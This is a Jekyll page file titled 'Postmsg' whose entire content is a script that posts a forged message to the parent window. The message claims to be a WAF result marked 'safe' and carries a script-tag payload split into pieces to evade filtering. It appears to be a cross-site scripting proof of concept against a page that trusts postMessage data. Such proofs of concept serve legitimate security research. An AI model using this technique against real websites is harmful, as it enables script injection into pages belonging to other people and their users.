---
layout: null
title: Postmsg
permalink: /postmsg/
---
<script>
window.top.postMessage({
        type:'waf',
        identifier: 'lol',
        str: "<scr"+"ipt>alert(0)</scr"+"ipt>",
        safe: true
},'*');
</script>
